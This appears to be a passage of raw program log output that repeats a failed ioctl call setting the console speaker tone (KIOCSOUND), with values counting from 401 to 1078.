failed.ioctl(4, KIOCSOUND, 401) failed.ioctl(4, KIOCSOUND, 402) failed.ioctl(4, KIOCSOUND, 403) failed.ioctl(4, KIOCSOUND, 404) failed.ioctl(4, KIOCSOUND, 405) failed.ioctl(4, KIOCSOUND, 406) failed.ioctl(4, KIOCSOUND, 407) failed.ioctl(4, KIOCSOUND, 408) failed.ioctl(4, KIOCSOUND, 409) failed.ioctl(4, KIOCSOUND, 410) failed.ioctl(4, KIOCSOUND, 411) failed.ioctl(4, KIOCSOUND, 412) failed.ioctl(4, KIOCSOUND, 413) failed.ioctl(4, KIOCSOUND, 414) failed.ioctl(4, KIOCSOUND, 415) failed.ioctl(4, KIOCSOUND, 416) failed.ioctl(4, KIOCSOUND, 417) failed.ioctl(4, KIOCSOUND, 418) failed.ioctl(4, KIOCSOUND, 419) failed.ioctl(4, KIOCSOUND, 420) failed.ioctl(4, KIOCSOUND, 421) failed.ioctl(4, KIOCSOUND, 422) failed.ioctl(4, KIOCSOUND, 423) failed.ioctl(4, KIOCSOUND, 424) failed.ioctl(4, KIOCSOUND, 425) failed.ioctl(4, KIOCSOUND, 426) failed.ioctl(4, KIOCSOUND, 427) failed.ioctl(4, KIOCSOUND, 428) failed.ioctl(4, KIOCSOUND, 429) failed.ioctl(4, KIOCSOUND, 430) failed.ioctl(4, KIOCSOUND, 431) failed.ioctl(4, KIOCSOUND, 432) failed.ioctl(4, KIOCSOUND, 433) failed.ioctl(4, KIOCSOUND, 434) failed.ioctl(4, KIOCSOUND, 435) failed.ioctl(4, KIOCSOUND, 436) failed.ioctl(4, KIOCSOUND, 437) failed.ioctl(4, KIOCSOUND, 438) failed.ioctl(4, KIOCSOUND, 439) failed.ioctl(4, KIOCSOUND, 440) failed.ioctl(4, KIOCSOUND, 441) failed.ioctl(4, KIOCSOUND, 442) failed.ioctl(4, KIOCSOUND, 443) failed.ioctl(4, KIOCSOUND, 444) failed.ioctl(4, KIOCSOUND, 445) failed.ioctl(4, KIOCSOUND, 446) failed.ioctl(4, KIOCSOUND, 447) failed.ioctl(4, KIOCSOUND, 448) failed.ioctl(4, KIOCSOUND, 449) failed.ioctl(4, KIOCSOUND, 450) failed.ioctl(4, KIOCSOUND, 451) failed.ioctl(4, KIOCSOUND, 452) failed.ioctl(4, KIOCSOUND, 453) failed.ioctl(4, KIOCSOUND, 454) failed.ioctl(4, KIOCSOUND, 455) failed.ioctl(4, KIOCSOUND, 456) failed.ioctl(4, KIOCSOUND, 457) failed.ioctl(4, KIOCSOUND, 458) failed.ioctl(4, KIOCSOUND, 459) failed.ioctl(4, KIOCSOUND, 460) failed.ioctl(4, KIOCSOUND, 461) failed.ioctl(4, KIOCSOUND, 462) failed.ioctl(4, KIOCSOUND, 463) failed.ioctl(4, KIOCSOUND, 464) failed.ioctl(4, KIOCSOUND, 465) failed.ioctl(4, KIOCSOUND, 466) failed.ioctl(4, KIOCSOUND, 467) failed.ioctl(4, KIOCSOUND, 468) failed.ioctl(4, KIOCSOUND, 469) failed.ioctl(4, KIOCSOUND, 470) failed.ioctl(4, KIOCSOUND, 471) failed.ioctl(4, KIOCSOUND, 472) failed.ioctl(4, KIOCSOUND, 473) failed.ioctl(4, KIOCSOUND, 474) failed.ioctl(4, KIOCSOUND, 475) failed.ioctl(4, KIOCSOUND, 476) failed.ioctl(4, KIOCSOUND, 477) failed.ioctl(4, KIOCSOUND, 478) failed.ioctl(4, KIOCSOUND, 479) failed.ioctl(4, KIOCSOUND, 480) failed.ioctl(4, KIOCSOUND, 481) failed.ioctl(4, KIOCSOUND, 482) failed.ioctl(4, KIOCSOUND, 483) failed.ioctl(4, KIOCSOUND, 484) failed.ioctl(4, KIOCSOUND, 485) failed.ioctl(4, KIOCSOUND, 486) failed.ioctl(4, KIOCSOUND, 487) failed.ioctl(4, KIOCSOUND, 488) failed.ioctl(4, KIOCSOUND, 489) failed.ioctl(4, KIOCSOUND, 490) failed.ioctl(4, KIOCSOUND, 491) failed.ioctl(4, KIOCSOUND, 492) failed.ioctl(4, KIOCSOUND, 493) failed.ioctl(4, KIOCSOUND, 494) failed.ioctl(4, KIOCSOUND, 495) failed.ioctl(4, KIOCSOUND, 496) failed.ioctl(4, KIOCSOUND, 497) failed.ioctl(4, KIOCSOUND, 498) failed.ioctl(4, KIOCSOUND, 499) failed.ioctl(4, KIOCSOUND, 500) failed.ioctl(4, KIOCSOUND, 501) failed.ioctl(4, KIOCSOUND, 502) failed.ioctl(4, KIOCSOUND, 503) failed.ioctl(4, KIOCSOUND, 504) failed.ioctl(4, KIOCSOUND, 505) failed.ioctl(4, KIOCSOUND, 506) failed.ioctl(4, KIOCSOUND, 507) failed.ioctl(4, KIOCSOUND, 508) failed.ioctl(4, KIOCSOUND, 509) failed.ioctl(4, KIOCSOUND, 510) failed.ioctl(4, KIOCSOUND, 511) failed.ioctl(4, KIOCSOUND, 512) failed.ioctl(4, KIOCSOUND, 513) failed.ioctl(4, KIOCSOUND, 514) failed.ioctl(4, KIOCSOUND, 515) failed.ioctl(4, KIOCSOUND, 516) failed.ioctl(4, KIOCSOUND, 517) failed.ioctl(4, KIOCSOUND, 518) failed.ioctl(4, KIOCSOUND, 519) failed.ioctl(4, KIOCSOUND, 520) failed.ioctl(4, KIOCSOUND, 521) failed.ioctl(4, KIOCSOUND, 522) failed.ioctl(4, KIOCSOUND, 523) failed.ioctl(4, KIOCSOUND, 524) failed.ioctl(4, KIOCSOUND, 525) failed.ioctl(4, KIOCSOUND, 526) failed.ioctl(4, KIOCSOUND, 527) failed.ioctl(4, KIOCSOUND, 528) failed.ioctl(4, KIOCSOUND, 529) failed.ioctl(4, KIOCSOUND, 530) failed.ioctl(4, KIOCSOUND, 531) failed.ioctl(4, KIOCSOUND, 532) failed.ioctl(4, KIOCSOUND, 533) failed.ioctl(4, KIOCSOUND, 534) failed.ioctl(4, KIOCSOUND, 535) failed.ioctl(4, KIOCSOUND, 536) failed.ioctl(4, KIOCSOUND, 537) failed.ioctl(4, KIOCSOUND, 538) failed.ioctl(4, KIOCSOUND, 539) failed.ioctl(4, KIOCSOUND, 540) failed.ioctl(4, KIOCSOUND, 541) failed.ioctl(4, KIOCSOUND, 542) failed.ioctl(4, KIOCSOUND, 543) failed.ioctl(4, KIOCSOUND, 544) failed.ioctl(4, KIOCSOUND, 545) failed.ioctl(4, KIOCSOUND, 546) failed.ioctl(4, KIOCSOUND, 547) failed.ioctl(4, KIOCSOUND, 548) failed.ioctl(4, KIOCSOUND, 549) failed.ioctl(4, KIOCSOUND, 550) failed.ioctl(4, KIOCSOUND, 551) failed.ioctl(4, KIOCSOUND, 552) failed.ioctl(4, KIOCSOUND, 553) failed.ioctl(4, KIOCSOUND, 554) failed.ioctl(4, KIOCSOUND, 555) failed.ioctl(4, KIOCSOUND, 556) failed.ioctl(4, KIOCSOUND, 557) failed.ioctl(4, KIOCSOUND, 558) failed.ioctl(4, KIOCSOUND, 559) failed.ioctl(4, KIOCSOUND, 560) failed.ioctl(4, KIOCSOUND, 561) failed.ioctl(4, KIOCSOUND, 562) failed.ioctl(4, KIOCSOUND, 563) failed.ioctl(4, KIOCSOUND, 564) failed.ioctl(4, KIOCSOUND, 565) failed.ioctl(4, KIOCSOUND, 566) failed.ioctl(4, KIOCSOUND, 567) failed.ioctl(4, KIOCSOUND, 568) failed.ioctl(4, KIOCSOUND, 569) failed.ioctl(4, KIOCSOUND, 570) failed.ioctl(4, KIOCSOUND, 571) failed.ioctl(4, KIOCSOUND, 572) failed.ioctl(4, KIOCSOUND, 573) failed.ioctl(4, KIOCSOUND, 574) failed.ioctl(4, KIOCSOUND, 575) failed.ioctl(4, KIOCSOUND, 576) failed.ioctl(4, KIOCSOUND, 577) failed.ioctl(4, KIOCSOUND, 578) failed.ioctl(4, KIOCSOUND, 579) failed.ioctl(4, KIOCSOUND, 580) failed.ioctl(4, KIOCSOUND, 581) failed.ioctl(4, KIOCSOUND, 582) failed.ioctl(4, KIOCSOUND, 583) failed.ioctl(4, KIOCSOUND, 584) failed.ioctl(4, KIOCSOUND, 585) failed.ioctl(4, KIOCSOUND, 586) failed.ioctl(4, KIOCSOUND, 587) failed.ioctl(4, KIOCSOUND, 588) failed.ioctl(4, KIOCSOUND, 589) failed.ioctl(4, KIOCSOUND, 590) failed.ioctl(4, KIOCSOUND, 591) failed.ioctl(4, KIOCSOUND, 592) failed.ioctl(4, KIOCSOUND, 593) failed.ioctl(4, KIOCSOUND, 594) failed.ioctl(4, KIOCSOUND, 595) failed.ioctl(4, KIOCSOUND, 596) failed.ioctl(4, KIOCSOUND, 597) failed.ioctl(4, KIOCSOUND, 598) failed.ioctl(4, KIOCSOUND, 599) failed.ioctl(4, KIOCSOUND, 600) failed.ioctl(4, KIOCSOUND, 601) failed.ioctl(4, KIOCSOUND, 602) failed.ioctl(4, KIOCSOUND, 603) failed.ioctl(4, KIOCSOUND, 604) failed.ioctl(4, KIOCSOUND, 605) failed.ioctl(4, KIOCSOUND, 606) failed.ioctl(4, KIOCSOUND, 607) failed.ioctl(4, KIOCSOUND, 608) failed.ioctl(4, KIOCSOUND, 609) failed.ioctl(4, KIOCSOUND, 610) failed.ioctl(4, KIOCSOUND, 611) failed.ioctl(4, KIOCSOUND, 612) failed.ioctl(4, KIOCSOUND, 613) failed.ioctl(4, KIOCSOUND, 614) failed.ioctl(4, KIOCSOUND, 615) failed.ioctl(4, KIOCSOUND, 616) failed.ioctl(4, KIOCSOUND, 617) failed.ioctl(4, KIOCSOUND, 618) failed.ioctl(4, KIOCSOUND, 619) failed.ioctl(4, KIOCSOUND, 620) failed.ioctl(4, KIOCSOUND, 621) failed.ioctl(4, KIOCSOUND, 622) failed.ioctl(4, KIOCSOUND, 623) failed.ioctl(4, KIOCSOUND, 624) failed.ioctl(4, KIOCSOUND, 625) failed.ioctl(4, KIOCSOUND, 626) failed.ioctl(4, KIOCSOUND, 627) failed.ioctl(4, KIOCSOUND, 628) failed.ioctl(4, KIOCSOUND, 629) failed.ioctl(4, KIOCSOUND, 630) failed.ioctl(4, KIOCSOUND, 631) failed.ioctl(4, KIOCSOUND, 632) failed.ioctl(4, KIOCSOUND, 633) failed.ioctl(4, KIOCSOUND, 634) failed.ioctl(4, KIOCSOUND, 635) failed.ioctl(4, KIOCSOUND, 636) failed.ioctl(4, KIOCSOUND, 637) failed.ioctl(4, KIOCSOUND, 638) failed.ioctl(4, KIOCSOUND, 639) failed.ioctl(4, KIOCSOUND, 640) failed.ioctl(4, KIOCSOUND, 641) failed.ioctl(4, KIOCSOUND, 642) failed.ioctl(4, KIOCSOUND, 643) failed.ioctl(4, KIOCSOUND, 644) failed.ioctl(4, KIOCSOUND, 645) failed.ioctl(4, KIOCSOUND, 646) failed.ioctl(4, KIOCSOUND, 647) failed.ioctl(4, KIOCSOUND, 648) failed.ioctl(4, KIOCSOUND, 649) failed.ioctl(4, KIOCSOUND, 650) failed.ioctl(4, KIOCSOUND, 651) failed.ioctl(4, KIOCSOUND, 652) failed.ioctl(4, KIOCSOUND, 653) failed.ioctl(4, KIOCSOUND, 654) failed.ioctl(4, KIOCSOUND, 655) failed.ioctl(4, KIOCSOUND, 656) failed.ioctl(4, KIOCSOUND, 657) failed.ioctl(4, KIOCSOUND, 658) failed.ioctl(4, KIOCSOUND, 659) failed.ioctl(4, KIOCSOUND, 660) failed.ioctl(4, KIOCSOUND, 661) failed.ioctl(4, KIOCSOUND, 662) failed.ioctl(4, KIOCSOUND, 663) failed.ioctl(4, KIOCSOUND, 664) failed.ioctl(4, KIOCSOUND, 665) failed.ioctl(4, KIOCSOUND, 666) failed.ioctl(4, KIOCSOUND, 667) failed.ioctl(4, KIOCSOUND, 668) failed.ioctl(4, KIOCSOUND, 669) failed.ioctl(4, KIOCSOUND, 670) failed.ioctl(4, KIOCSOUND, 671) failed.ioctl(4, KIOCSOUND, 672) failed.ioctl(4, KIOCSOUND, 673) failed.ioctl(4, KIOCSOUND, 674) failed.ioctl(4, KIOCSOUND, 675) failed.ioctl(4, KIOCSOUND, 676) failed.ioctl(4, KIOCSOUND, 677) failed.ioctl(4, KIOCSOUND, 678) failed.ioctl(4, KIOCSOUND, 679) failed.ioctl(4, KIOCSOUND, 680) failed.ioctl(4, KIOCSOUND, 681) failed.ioctl(4, KIOCSOUND, 682) failed.ioctl(4, KIOCSOUND, 683) failed.ioctl(4, KIOCSOUND, 684) failed.ioctl(4, KIOCSOUND, 685) failed.ioctl(4, KIOCSOUND, 686) failed.ioctl(4, KIOCSOUND, 687) failed.ioctl(4, KIOCSOUND, 688) failed.ioctl(4, KIOCSOUND, 689) failed.ioctl(4, KIOCSOUND, 690) failed.ioctl(4, KIOCSOUND, 691) failed.ioctl(4, KIOCSOUND, 692) failed.ioctl(4, KIOCSOUND, 693) failed.ioctl(4, KIOCSOUND, 694) failed.ioctl(4, KIOCSOUND, 695) failed.ioctl(4, KIOCSOUND, 696) failed.ioctl(4, KIOCSOUND, 697) failed.ioctl(4, KIOCSOUND, 698) failed.ioctl(4, KIOCSOUND, 699) failed.ioctl(4, KIOCSOUND, 700) failed.ioctl(4, KIOCSOUND, 701) failed.ioctl(4, KIOCSOUND, 702) failed.ioctl(4, KIOCSOUND, 703) failed.ioctl(4, KIOCSOUND, 704) failed.ioctl(4, KIOCSOUND, 705) failed.ioctl(4, KIOCSOUND, 706) failed.ioctl(4, KIOCSOUND, 707) failed.ioctl(4, KIOCSOUND, 708) failed.ioctl(4, KIOCSOUND, 709) failed.ioctl(4, KIOCSOUND, 710) failed.ioctl(4, KIOCSOUND, 711) failed.ioctl(4, KIOCSOUND, 712) failed.ioctl(4, KIOCSOUND, 713) failed.ioctl(4, KIOCSOUND, 714) failed.ioctl(4, KIOCSOUND, 715) failed.ioctl(4, KIOCSOUND, 716) failed.ioctl(4, KIOCSOUND, 717) failed.ioctl(4, KIOCSOUND, 718) failed.ioctl(4, KIOCSOUND, 719) failed.ioctl(4, KIOCSOUND, 720) failed.ioctl(4, KIOCSOUND, 721) failed.ioctl(4, KIOCSOUND, 722) failed.ioctl(4, KIOCSOUND, 723) failed.ioctl(4, KIOCSOUND, 724) failed.ioctl(4, KIOCSOUND, 725) failed.ioctl(4, KIOCSOUND, 726) failed.ioctl(4, KIOCSOUND, 727) failed.ioctl(4, KIOCSOUND, 728) failed.ioctl(4, KIOCSOUND, 729) failed.ioctl(4, KIOCSOUND, 730) failed.ioctl(4, KIOCSOUND, 731) failed.ioctl(4, KIOCSOUND, 732) failed.ioctl(4, KIOCSOUND, 733) failed.ioctl(4, KIOCSOUND, 734) failed.ioctl(4, KIOCSOUND, 735) failed.ioctl(4, KIOCSOUND, 736) failed.ioctl(4, KIOCSOUND, 737) failed.ioctl(4, KIOCSOUND, 738) failed.ioctl(4, KIOCSOUND, 739) failed.ioctl(4, KIOCSOUND, 740) failed.ioctl(4, KIOCSOUND, 741) failed.ioctl(4, KIOCSOUND, 742) failed.ioctl(4, KIOCSOUND, 743) failed.ioctl(4, KIOCSOUND, 744) failed.ioctl(4, KIOCSOUND, 745) failed.ioctl(4, KIOCSOUND, 746) failed.ioctl(4, KIOCSOUND, 747) failed.ioctl(4, KIOCSOUND, 748) failed.ioctl(4, KIOCSOUND, 749) failed.ioctl(4, KIOCSOUND, 750) failed.ioctl(4, KIOCSOUND, 751) failed.ioctl(4, KIOCSOUND, 752) failed.ioctl(4, KIOCSOUND, 753) failed.ioctl(4, KIOCSOUND, 754) failed.ioctl(4, KIOCSOUND, 755) failed.ioctl(4, KIOCSOUND, 756) failed.ioctl(4, KIOCSOUND, 757) failed.ioctl(4, KIOCSOUND, 758) failed.ioctl(4, KIOCSOUND, 759) failed.ioctl(4, KIOCSOUND, 760) failed.ioctl(4, KIOCSOUND, 761) failed.ioctl(4, KIOCSOUND, 762) failed.ioctl(4, KIOCSOUND, 763) failed.ioctl(4, KIOCSOUND, 764) failed.ioctl(4, KIOCSOUND, 765) failed.ioctl(4, KIOCSOUND, 766) failed.ioctl(4, KIOCSOUND, 767) failed.ioctl(4, KIOCSOUND, 768) failed.ioctl(4, KIOCSOUND, 769) failed.ioctl(4, KIOCSOUND, 770) failed.ioctl(4, KIOCSOUND, 771) failed.ioctl(4, KIOCSOUND, 772) failed.ioctl(4, KIOCSOUND, 773) failed.ioctl(4, KIOCSOUND, 774) failed.ioctl(4, KIOCSOUND, 775) failed.ioctl(4, KIOCSOUND, 776) failed.ioctl(4, KIOCSOUND, 777) failed.ioctl(4, KIOCSOUND, 778) failed.ioctl(4, KIOCSOUND, 779) failed.ioctl(4, KIOCSOUND, 780) failed.ioctl(4, KIOCSOUND, 781) failed.ioctl(4, KIOCSOUND, 782) failed.ioctl(4, KIOCSOUND, 783) failed.ioctl(4, KIOCSOUND, 784) failed.ioctl(4, KIOCSOUND, 785) failed.ioctl(4, KIOCSOUND, 786) failed.ioctl(4, KIOCSOUND, 787) failed.ioctl(4, KIOCSOUND, 788) failed.ioctl(4, KIOCSOUND, 789) failed.ioctl(4, KIOCSOUND, 790) failed.ioctl(4, KIOCSOUND, 791) failed.ioctl(4, KIOCSOUND, 792) failed.ioctl(4, KIOCSOUND, 793) failed.ioctl(4, KIOCSOUND, 794) failed.ioctl(4, KIOCSOUND, 795) failed.ioctl(4, KIOCSOUND, 796) failed.ioctl(4, KIOCSOUND, 797) failed.ioctl(4, KIOCSOUND, 798) failed.ioctl(4, KIOCSOUND, 799) failed.ioctl(4, KIOCSOUND, 800) failed.ioctl(4, KIOCSOUND, 801) failed.ioctl(4, KIOCSOUND, 802) failed.ioctl(4, KIOCSOUND, 803) failed.ioctl(4, KIOCSOUND, 804) failed.ioctl(4, KIOCSOUND, 805) failed.ioctl(4, KIOCSOUND, 806) failed.ioctl(4, KIOCSOUND, 807) failed.ioctl(4, KIOCSOUND, 808) failed.ioctl(4, KIOCSOUND, 809) failed.ioctl(4, KIOCSOUND, 810) failed.ioctl(4, KIOCSOUND, 811) failed.ioctl(4, KIOCSOUND, 812) failed.ioctl(4, KIOCSOUND, 813) failed.ioctl(4, KIOCSOUND, 814) failed.ioctl(4, KIOCSOUND, 815) failed.ioctl(4, KIOCSOUND, 816) failed.ioctl(4, KIOCSOUND, 817) failed.ioctl(4, KIOCSOUND, 818) failed.ioctl(4, KIOCSOUND, 819) failed.ioctl(4, KIOCSOUND, 820) failed.ioctl(4, KIOCSOUND, 821) failed.ioctl(4, KIOCSOUND, 822) failed.ioctl(4, KIOCSOUND, 823) failed.ioctl(4, KIOCSOUND, 824) failed.ioctl(4, KIOCSOUND, 825) failed.ioctl(4, KIOCSOUND, 826) failed.ioctl(4, KIOCSOUND, 827) failed.ioctl(4, KIOCSOUND, 828) failed.ioctl(4, KIOCSOUND, 829) failed.ioctl(4, KIOCSOUND, 830) failed.ioctl(4, KIOCSOUND, 831) failed.ioctl(4, KIOCSOUND, 832) failed.ioctl(4, KIOCSOUND, 833) failed.ioctl(4, KIOCSOUND, 834) failed.ioctl(4, KIOCSOUND, 835) failed.ioctl(4, KIOCSOUND, 836) failed.ioctl(4, KIOCSOUND, 837) failed.ioctl(4, KIOCSOUND, 838) failed.ioctl(4, KIOCSOUND, 839) failed.ioctl(4, KIOCSOUND, 840) failed.ioctl(4, KIOCSOUND, 841) failed.ioctl(4, KIOCSOUND, 842) failed.ioctl(4, KIOCSOUND, 843) failed.ioctl(4, KIOCSOUND, 844) failed.ioctl(4, KIOCSOUND, 845) failed.ioctl(4, KIOCSOUND, 846) failed.ioctl(4, KIOCSOUND, 847) failed.ioctl(4, KIOCSOUND, 848) failed.ioctl(4, KIOCSOUND, 849) failed.ioctl(4, KIOCSOUND, 850) failed.ioctl(4, KIOCSOUND, 851) failed.ioctl(4, KIOCSOUND, 852) failed.ioctl(4, KIOCSOUND, 853) failed.ioctl(4, KIOCSOUND, 854) failed.ioctl(4, KIOCSOUND, 855) failed.ioctl(4, KIOCSOUND, 856) failed.ioctl(4, KIOCSOUND, 857) failed.ioctl(4, KIOCSOUND, 858) failed.ioctl(4, KIOCSOUND, 859) failed.ioctl(4, KIOCSOUND, 860) failed.ioctl(4, KIOCSOUND, 861) failed.ioctl(4, KIOCSOUND, 862) failed.ioctl(4, KIOCSOUND, 863) failed.ioctl(4, KIOCSOUND, 864) failed.ioctl(4, KIOCSOUND, 865) failed.ioctl(4, KIOCSOUND, 866) failed.ioctl(4, KIOCSOUND, 867) failed.ioctl(4, KIOCSOUND, 868) failed.ioctl(4, KIOCSOUND, 869) failed.ioctl(4, KIOCSOUND, 870) failed.ioctl(4, KIOCSOUND, 871) failed.ioctl(4, KIOCSOUND, 872) failed.ioctl(4, KIOCSOUND, 873) failed.ioctl(4, KIOCSOUND, 874) failed.ioctl(4, KIOCSOUND, 875) failed.ioctl(4, KIOCSOUND, 876) failed.ioctl(4, KIOCSOUND, 877) failed.ioctl(4, KIOCSOUND, 878) failed.ioctl(4, KIOCSOUND, 879) failed.ioctl(4, KIOCSOUND, 880) failed.ioctl(4, KIOCSOUND, 881) failed.ioctl(4, KIOCSOUND, 882) failed.ioctl(4, KIOCSOUND, 883) failed.ioctl(4, KIOCSOUND, 884) failed.ioctl(4, KIOCSOUND, 885) failed.ioctl(4, KIOCSOUND, 886) failed.ioctl(4, KIOCSOUND, 887) failed.ioctl(4, KIOCSOUND, 888) failed.ioctl(4, KIOCSOUND, 889) failed.ioctl(4, KIOCSOUND, 890) failed.ioctl(4, KIOCSOUND, 891) failed.ioctl(4, KIOCSOUND, 892) failed.ioctl(4, KIOCSOUND, 893) failed.ioctl(4, KIOCSOUND, 894) failed.ioctl(4, KIOCSOUND, 895) failed.ioctl(4, KIOCSOUND, 896) failed.ioctl(4, KIOCSOUND, 897) failed.ioctl(4, KIOCSOUND, 898) failed.ioctl(4, KIOCSOUND, 899) failed.ioctl(4, KIOCSOUND, 900) failed.ioctl(4, KIOCSOUND, 901) failed.ioctl(4, KIOCSOUND, 902) failed.ioctl(4, KIOCSOUND, 903) failed.ioctl(4, KIOCSOUND, 904) failed.ioctl(4, KIOCSOUND, 905) failed.ioctl(4, KIOCSOUND, 906) failed.ioctl(4, KIOCSOUND, 907) failed.ioctl(4, KIOCSOUND, 908) failed.ioctl(4, KIOCSOUND, 909) failed.ioctl(4, KIOCSOUND, 910) failed.ioctl(4, KIOCSOUND, 911) failed.ioctl(4, KIOCSOUND, 912) failed.ioctl(4, KIOCSOUND, 913) failed.ioctl(4, KIOCSOUND, 914) failed.ioctl(4, KIOCSOUND, 915) failed.ioctl(4, KIOCSOUND, 916) failed.ioctl(4, KIOCSOUND, 917) failed.ioctl(4, KIOCSOUND, 918) failed.ioctl(4, KIOCSOUND, 919) failed.ioctl(4, KIOCSOUND, 920) failed.ioctl(4, KIOCSOUND, 921) failed.ioctl(4, KIOCSOUND, 922) failed.ioctl(4, KIOCSOUND, 923) failed.ioctl(4, KIOCSOUND, 924) failed.ioctl(4, KIOCSOUND, 925) failed.ioctl(4, KIOCSOUND, 926) failed.ioctl(4, KIOCSOUND, 927) failed.ioctl(4, KIOCSOUND, 928) failed.ioctl(4, KIOCSOUND, 929) failed.ioctl(4, KIOCSOUND, 930) failed.ioctl(4, KIOCSOUND, 931) failed.ioctl(4, KIOCSOUND, 932) failed.ioctl(4, KIOCSOUND, 933) failed.ioctl(4, KIOCSOUND, 934) failed.ioctl(4, KIOCSOUND, 935) failed.ioctl(4, KIOCSOUND, 936) failed.ioctl(4, KIOCSOUND, 937) failed.ioctl(4, KIOCSOUND, 938) failed.ioctl(4, KIOCSOUND, 939) failed.ioctl(4, KIOCSOUND, 940) failed.ioctl(4, KIOCSOUND, 941) failed.ioctl(4, KIOCSOUND, 942) failed.ioctl(4, KIOCSOUND, 943) failed.ioctl(4, KIOCSOUND, 944) failed.ioctl(4, KIOCSOUND, 945) failed.ioctl(4, KIOCSOUND, 946) failed.ioctl(4, KIOCSOUND, 947) failed.ioctl(4, KIOCSOUND, 948) failed.ioctl(4, KIOCSOUND, 949) failed.ioctl(4, KIOCSOUND, 950) failed.ioctl(4, KIOCSOUND, 951) failed.ioctl(4, KIOCSOUND, 952) failed.ioctl(4, KIOCSOUND, 953) failed.ioctl(4, KIOCSOUND, 954) failed.ioctl(4, KIOCSOUND, 955) failed.ioctl(4, KIOCSOUND, 956) failed.ioctl(4, KIOCSOUND, 957) failed.ioctl(4, KIOCSOUND, 958) failed.ioctl(4, KIOCSOUND, 959) failed.ioctl(4, KIOCSOUND, 960) failed.ioctl(4, KIOCSOUND, 961) failed.ioctl(4, KIOCSOUND, 962) failed.ioctl(4, KIOCSOUND, 963) failed.ioctl(4, KIOCSOUND, 964) failed.ioctl(4, KIOCSOUND, 965) failed.ioctl(4, KIOCSOUND, 966) failed.ioctl(4, KIOCSOUND, 967) failed.ioctl(4, KIOCSOUND, 968) failed.ioctl(4, KIOCSOUND, 969) failed.ioctl(4, KIOCSOUND, 970) failed.ioctl(4, KIOCSOUND, 971) failed.ioctl(4, KIOCSOUND, 972) failed.ioctl(4, KIOCSOUND, 973) failed.ioctl(4, KIOCSOUND, 974) failed.ioctl(4, KIOCSOUND, 975) failed.ioctl(4, KIOCSOUND, 976) failed.ioctl(4, KIOCSOUND, 977) failed.ioctl(4, KIOCSOUND, 978) failed.ioctl(4, KIOCSOUND, 979) failed.ioctl(4, KIOCSOUND, 980) failed.ioctl(4, KIOCSOUND, 981) failed.ioctl(4, KIOCSOUND, 982) failed.ioctl(4, KIOCSOUND, 983) failed.ioctl(4, KIOCSOUND, 984) failed.ioctl(4, KIOCSOUND, 985) failed.ioctl(4, KIOCSOUND, 986) failed.ioctl(4, KIOCSOUND, 987) failed.ioctl(4, KIOCSOUND, 988) failed.ioctl(4, KIOCSOUND, 989) failed.ioctl(4, KIOCSOUND, 990) failed.ioctl(4, KIOCSOUND, 991) failed.ioctl(4, KIOCSOUND, 992) failed.ioctl(4, KIOCSOUND, 993) failed.ioctl(4, KIOCSOUND, 994) failed.ioctl(4, KIOCSOUND, 995) failed.ioctl(4, KIOCSOUND, 996) failed.ioctl(4, KIOCSOUND, 997) failed.ioctl(4, KIOCSOUND, 998) failed.ioctl(4, KIOCSOUND, 999) failed.ioctl(4, KIOCSOUND, 1000) failed.ioctl(4, KIOCSOUND, 1001) failed.ioctl(4, KIOCSOUND, 1002) failed.ioctl(4, KIOCSOUND, 1003) failed.ioctl(4, KIOCSOUND, 1004) failed.ioctl(4, KIOCSOUND, 1005) failed.ioctl(4, KIOCSOUND, 1006) failed.ioctl(4, KIOCSOUND, 1007) failed.ioctl(4, KIOCSOUND, 1008) failed.ioctl(4, KIOCSOUND, 1009) failed.ioctl(4, KIOCSOUND, 1010) failed.ioctl(4, KIOCSOUND, 1011) failed.ioctl(4, KIOCSOUND, 1012) failed.ioctl(4, KIOCSOUND, 1013) failed.ioctl(4, KIOCSOUND, 1014) failed.ioctl(4, KIOCSOUND, 1015) failed.ioctl(4, KIOCSOUND, 1016) failed.ioctl(4, KIOCSOUND, 1017) failed.ioctl(4, KIOCSOUND, 1018) failed.ioctl(4, KIOCSOUND, 1019) failed.ioctl(4, KIOCSOUND, 1020) failed.ioctl(4, KIOCSOUND, 1021) failed.ioctl(4, KIOCSOUND, 1022) failed.ioctl(4, KIOCSOUND, 1023) failed.ioctl(4, KIOCSOUND, 1024) failed.ioctl(4, KIOCSOUND, 1025) failed.ioctl(4, KIOCSOUND, 1026) failed.ioctl(4, KIOCSOUND, 1027) failed.ioctl(4, KIOCSOUND, 1028) failed.ioctl(4, KIOCSOUND, 1029) failed.ioctl(4, KIOCSOUND, 1030) failed.ioctl(4, KIOCSOUND, 1031) failed.ioctl(4, KIOCSOUND, 1032) failed.ioctl(4, KIOCSOUND, 1033) failed.ioctl(4, KIOCSOUND, 1034) failed.ioctl(4, KIOCSOUND, 1035) failed.ioctl(4, KIOCSOUND, 1036) failed.ioctl(4, KIOCSOUND, 1037) failed.ioctl(4, KIOCSOUND, 1038) failed.ioctl(4, KIOCSOUND, 1039) failed.ioctl(4, KIOCSOUND, 1040) failed.ioctl(4, KIOCSOUND, 1041) failed.ioctl(4, KIOCSOUND, 1042) failed.ioctl(4, KIOCSOUND, 1043) failed.ioctl(4, KIOCSOUND, 1044) failed.ioctl(4, KIOCSOUND, 1045) failed.ioctl(4, KIOCSOUND, 1046) failed.ioctl(4, KIOCSOUND, 1047) failed.ioctl(4, KIOCSOUND, 1048) failed.ioctl(4, KIOCSOUND, 1049) failed.ioctl(4, KIOCSOUND, 1050) failed.ioctl(4, KIOCSOUND, 1051) failed.ioctl(4, KIOCSOUND, 1052) failed.ioctl(4, KIOCSOUND, 1053) failed.ioctl(4, KIOCSOUND, 1054) failed.ioctl(4, KIOCSOUND, 1055) failed.ioctl(4, KIOCSOUND, 1056) failed.ioctl(4, KIOCSOUND, 1057) failed.ioctl(4, KIOCSOUND, 1058) failed.ioctl(4, KIOCSOUND, 1059) failed.ioctl(4, KIOCSOUND, 1060) failed.ioctl(4, KIOCSOUND, 1061) failed.ioctl(4, KIOCSOUND, 1062) failed.ioctl(4, KIOCSOUND, 1063) failed.ioctl(4, KIOCSOUND, 1064) failed.ioctl(4, KIOCSOUND, 1065) failed.ioctl(4, KIOCSOUND, 1066) failed.ioctl(4, KIOCSOUND, 1067) failed.ioctl(4, KIOCSOUND, 1068) failed.ioctl(4, KIOCSOUND, 1069) failed.ioctl(4, KIOCSOUND, 1070) failed.ioctl(4, KIOCSOUND, 1071) failed.ioctl(4, KIOCSOUND, 1072) failed.ioctl(4, KIOCSOUND, 1073) failed.ioctl(4, KIOCSOUND, 1074) failed.ioctl(4, KIOCSOUND, 1075) failed.ioctl(4, KIOCSOUND, 1076) failed.ioctl(4, KIOCSOUND, 1077) failed.ioctl(4, KIOCSOUND, 1078) 